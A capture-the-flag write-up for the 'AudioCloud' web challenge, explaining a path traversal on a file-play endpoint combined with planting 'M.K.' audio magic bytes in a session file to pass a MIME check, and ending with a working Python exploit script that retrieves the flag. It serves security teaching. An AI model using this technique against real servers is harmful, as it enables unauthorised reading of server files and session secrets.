# Web - AudioCloud
**Author** : jvvan  
**Difficulty**: <font color='orange'>Medium</font>  
**Description**: Are you an up-and-coming music artist? Come and upload your mp3 files to AudioCloud!

**Flag**: ``SCC{1m_c0nfu53d_why_15_my_535510n_4n_mp3_f1l3}``

# Writeup

The website allows users to upload their songs with a name and an mp3 file.

The songs are stored in a server side session file.
The serialization algorithm is far from perfect, but it's mostly a red herring.

There is an endpoint that allows us to play files whose mime type starts with `audio/`: `/play_file?name=PATH`
We can notice that it doesn't protect against path traversal, so we can access any file on the server if the mime type is correct.

The flag is stored inside the session, so we have to leak it.


The idea is to make the `file` command think that our session is an mp3 file which will allow us to play it and leak the flag.
Usually mp3 files have a header (start of the file) that looks like this:
```
ID3 (ascii) or 49 44 33 (hex)
```

However, we can't modify the start of the session file. So what can we do?

A session file looks like this
```
0000000213dict00000000020000000004strflag0000000014strSCC{fake_flag}0000000005strsongs0000000127list00000000010000000103dict00000000020000000002strid0000000036str2ce28af1-8509-45b9-88ce-88e1d2cf56e30000000004strname0000000009strSong Name
```

It looks like we can edit the middle of the file using the song name. 

`file` command works by checking "magic bytes" of a file.
Well, are there any audio magic bytes in the middle of the file?
We can find the magic database on the internet: https://github.com/file/file/blob/master/magic/Magdir/audio

The answer is yes!
```
1080	string	M.K.		audio/x-mod
```

If put `M.K.` at the offset of 1080, it'll make the session file be an `audio/x-mod` file which will bypass the mime check.
We can't predict exactly where the offset will be, but we can put "M.K." in the song name a lot of times and then just check it 4-5 times with a different offset.

We also have to make sure to use a different session each time because the song name will just be appended to the existing array.

Now we just have to read our session file, but its name is serialized with 
```py
serializer = URLSafeSerializer("your-secret-key")

f"{serializer.dumps(session_id)}.sess"
```

It's just using a default key, so we can predict the file name locally using the same key.

### Automated Script

```python
SITE_URL = "http://localhost:5000"

import requests
from itsdangerous import URLSafeSerializer
from uuid import uuid4
import re
from io import BytesIO

serializer = URLSafeSerializer("your-secret-key")


def solve(offset):
    session = str(uuid4())

    res = requests.post(
        SITE_URL,
        cookies={"session": session},
        files={"file": ("test.mp3", BytesIO(b"0"))},
        data={"name": "a" * offset + "M.K." * 300},
    )

    session_file = serializer.dumps(session)
    session_path = f"/app/sessions/{session_file}.sess"

    res = requests.get(
        f"{SITE_URL}/play_file",
        cookies={"session": session},
        params={"name": session_path},
    )

    if res.status_code == 200:
        match = re.search(r"SCC{.*}", res.text)
        if match:
            flag = match.group(0)
            return flag


for i in range(5):
    print(f"Trying offset: {i}")
    flag = solve(i)
    if flag:
        print(f"Flag found: {flag}")
        break

```